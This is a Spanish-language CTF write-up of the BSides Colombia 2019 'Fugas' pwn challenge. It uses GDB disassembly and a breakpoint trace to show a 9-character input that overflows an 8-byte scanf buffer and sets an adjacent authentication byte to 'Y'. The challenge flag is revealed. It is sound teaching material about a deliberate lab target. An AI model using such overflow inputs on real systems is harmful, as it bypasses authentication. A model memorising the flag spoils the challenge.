# __BSides Colombia 2019__
## _Fugas_

 ## Información 
**Categoría:** | **Writeup Author**
--- | ---
Pwn | Huascar Tejeda <<htejeda@f2tc.com>>

**Descripción:**

> Controlo el acceso de mis usuarios pero ellos no se contienen y no entiendo porque pasa :(
> retos.bsides.ctf.co:31332
>
> [chall](inbox.c)

**Bandera:**

> BSidesCo{GO0O0O0v3rfl0W}

## Solución

Para solucionar este desafío podemos hacer un overflow simple para que la variable `authenticated` sea siempre el valor esperado (Y) a la hora de la comparación.
Esto es posible gracias a que el desarrollador utilizó la función vulnerable scanf.

Análisis básico del binario 32-bits:

```gef➤  disas main
Dump of assembler code for function main:
   0x08048569 <+0>: lea    ecx,[esp+0x4]
   0x0804856d <+4>: and    esp,0xfffffff0
   0x08048570 <+7>: push   DWORD PTR [ecx-0x4]
   0x08048573 <+10>: push   ebp
   0x08048574 <+11>: mov    ebp,esp
   0x08048576 <+13>: push   ecx
   0x08048577 <+14>: sub    esp,0x14
   0x0804857a <+17>: mov    eax,ds:0x804a040
   0x0804857f <+22>: push   0x0
   0x08048581 <+24>: push   0x2
   0x08048583 <+26>: push   0x0
   0x08048585 <+28>: push   eax
   0x08048586 <+29>: call   0x8048410 <setvbuf@plt>
   0x0804858b <+34>: add    esp,0x10
   0x0804858e <+37>: mov    eax,ds:0x804a044
   0x08048593 <+42>: push   0x0
   0x08048595 <+44>: push   0x2
   0x08048597 <+46>: push   0x0
   0x08048599 <+48>: push   eax
   0x0804859a <+49>: call   0x8048410 <setvbuf@plt>
   0x0804859f <+54>: add    esp,0x10
   0x080485a2 <+57>: mov    BYTE PTR [ebp-0x9],0x4e
   0x080485a6 <+61>: sub    esp,0xc
   0x080485a9 <+64>: push   0x8048744
   0x080485ae <+69>: call   0x80483f0 <puts@plt>
   0x080485b3 <+74>: add    esp,0x10
   0x080485b6 <+77>: sub    esp,0xc
   0x080485b9 <+80>: push   0x8048771
   0x080485be <+85>: call   0x80483f0 <puts@plt>
   0x080485c3 <+90>: add    esp,0x10
   0x080485c6 <+93>: sub    esp,0x4
   0x080485c9 <+96>: push   0x804878f
   0x080485ce <+101>: push   0x8048798
   0x080485d3 <+106>: push   0x80487a0
   0x080485d8 <+111>: call   0x80483e0 <printf@plt>
   0x080485dd <+116>: add    esp,0x10
   0x080485e0 <+119>: sub    esp,0x4
   0x080485e3 <+122>: push   0x80487ab
   0x080485e8 <+127>: push   0x80487bb
   0x080485ed <+132>: push   0x80487a0
   0x080485f2 <+137>: call   0x80483e0 <printf@plt>
   0x080485f7 <+142>: add    esp,0x10
   0x080485fa <+145>: sub    esp,0xc
   0x080485fd <+148>: push   0x80487c4
   0x08048602 <+153>: call   0x80483f0 <puts@plt>
   0x08048607 <+158>: add    esp,0x10
   0x0804860a <+161>: sub    esp,0xc
   0x0804860d <+164>: push   0x80487f4
   0x08048612 <+169>: call   0x80483f0 <puts@plt>
   0x08048617 <+174>: add    esp,0x10
   0x0804861a <+177>: sub    esp,0xc
   0x0804861d <+180>: push   0x8048828
   0x08048622 <+185>: call   0x80483f0 <puts@plt>
   0x08048627 <+190>: add    esp,0x10
   0x0804862a <+193>: sub    esp,0xc
   0x0804862d <+196>: push   0x8048859
   0x08048632 <+201>: call   0x80483e0 <printf@plt>
   0x08048637 <+206>: add    esp,0x10
   0x0804863a <+209>: sub    esp,0x8
   0x0804863d <+212>: lea    eax,[ebp-0x11]
   0x08048640 <+215>: push   eax
   0x08048641 <+216>: push   0x804886a
   0x08048646 <+221>: call   0x8048420 <__isoc99_scanf@plt>
   0x0804864b <+226>: add    esp,0x10
   0x0804864e <+229>: sub    esp,0x8
   0x08048651 <+232>: push   0x804886d
   0x08048656 <+237>: lea    eax,[ebp-0x11]
   0x08048659 <+240>: push   eax
   0x0804865a <+241>: call   0x80483d0 <strcmp@plt>
   0x0804865f <+246>: add    esp,0x10
   0x08048662 <+249>: test   eax,eax
   0x08048664 <+251>: jne    0x804866a <main+257>  ; Siempre iremos a main+257 porque el password que digitamos no va a coincidir con el esperado por el software.
   0x08048666 <+253>: mov    BYTE PTR [ebp-0x9],0x59
   0x0804866a <+257>: cmp    BYTE PTR [ebp-0x9],0x59
   0x0804866e <+261>: jne    0x8048677 <main+270>
   0x08048670 <+263>: call   0x804853b <displayInbox>
   0x08048675 <+268>: jmp    0x8048687 <main+286>
   0x08048677 <+270>: sub    esp,0xc
   0x0804867a <+273>: push   0x8048875
   0x0804867f <+278>: call   0x80483f0 <puts@plt>
   0x08048684 <+283>: add    esp,0x10
   0x08048687 <+286>: nop
   0x08048688 <+287>: mov    ecx,DWORD PTR [ebp-0x4]
   0x0804868b <+290>: leave
   0x0804868c <+291>: lea    esp,[ecx-0x4]
   0x0804868f <+294>: ret
   ```

Cuando el programa nos pida digitar la clave, vamos a entrar una cadena de 9 cracteres. 8 bytes del `char password[8]` y 1 byte para sobre-escribir el valor de la variable `authenticated` con un `Y`.

Ponemos el breakpoint en la comparación `if (authenticated == 'Y')` y utilziamos el password "<span style="color:blue">BSidesCo</span><span style="color:red">**Y**</span>":

```
gef➤  b *0x0804866a
Breakpoint 1 at 0x804866a
gef➤  r
Starting program: /home/htejeda/bsides/tmp/inbox
====================|==|====================
SERVICIO DE CORREO SIN MEDIDA
Usuario     : Rodolfo
Bandeja     : 1 nuevo correo
====================|==|====================

Se requiere una clave para observar el correo...
ADVERTENCIA: SE RECOMIENA UNA CLAVE DE 7 DIGITOS
Entre su clave: BSidesCoY

Breakpoint 1, 0x0804866a in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffffff
$ebx   : 0x0
$ecx   : 0x45
$edx   : 0xffffd477  →  "BSidesCoY"
$esp   : 0xffffd470  →  0x00000001
$ebp   : 0xffffd488  →  0x00000000
$esi   : 0xf7fb4000  →  0x001b1db0
$edi   : 0xf7fb4000  →  0x001b1db0
$eip   : 0x0804866a  →  <main+257> cmp BYTE PTR [ebp-0x9], 0x59
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd470│+0x0000: 0x00000001  ← $esp
0xffffd474│+0x0004: 0x42ffd534
0xffffd478│+0x0008: "SidesCoY"
0xffffd47c│+0x000c: "sCoY"
0xffffd480│+0x0010: 0xf7fb4300  →  0xf7f5d447  →  "ISO-10646/UCS2/"
0xffffd484│+0x0014: 0xffffd4a0  →  0x00000001
0xffffd488│+0x0018: 0x00000000  ← $ebp
0xffffd48c│+0x001c: 0xf7e1a637  →  <__libc_start_main+247> add esp, 0x10
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804865e <main+245>       inc    DWORD PTR [ebx-0x3f7aef3c]
    0x8048664 <main+251>       jne    0x804866a <main+257>
    0x8048666 <main+253>       mov    BYTE PTR [ebp-0x9], 0x59
 →  0x804866a <main+257>       cmp    BYTE PTR [ebp-0x9], 0x59
    0x804866e <main+261>       jne    0x8048677 <main+270>
    0x8048670 <main+263>       call   0x804853b <displayInbox>
    0x8048675 <main+268>       jmp    0x8048687 <main+286>
    0x8048677 <main+270>       sub    esp, 0xc
    0x804867a <main+273>       push   0x8048875
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "inbox", stopped, reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804866a → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/s $ebp-0x9
0xffffd47f: "Y"
gef➤  c
Continuing.

Cargando la bandeja de entrada...
BSidesCo{}
```

Luego de ver que la cadena funcionó, podemos buscar nuestro flag:

```
❯❯❯ nc retos.bsides.ctf.co 31332
====================|==|====================
SERVICIO DE CORREO SIN MEDIDA
Usuario     : Rodolfo
Bandeja     : 1 nuevo correo
====================|==|====================

Se requiere una clave para observar el correo...
ADVERTENCIA: SE RECOMIENA UNA CLAVE DE 7 DIGITOS
Entre su clave: BSidesCoY

Cargando la bandeja...

Email 1: From (sedisb@anon44f8zh7c8a.onion)
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
I'll be sending out invitations shortly. Will most likely host
the recruitment site on the dark web. Was wondering if you had
any good suggestions for the recruitment challenge. Thanks.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v3.3.7 (MingW32)
iD8DBQFFxqRFCMEe9B/8oqEaE5RtJ91Tx4RziVzY4eR4Ms4MFsKAMqOoQCgg7y6
e5AJIRuLUIUikjNWQIW63QE=
=aAhr
-----END PGP SIGNATURE-----
Email 1: End

BSidesCo{GO0O0O0v3rfl0W}
```
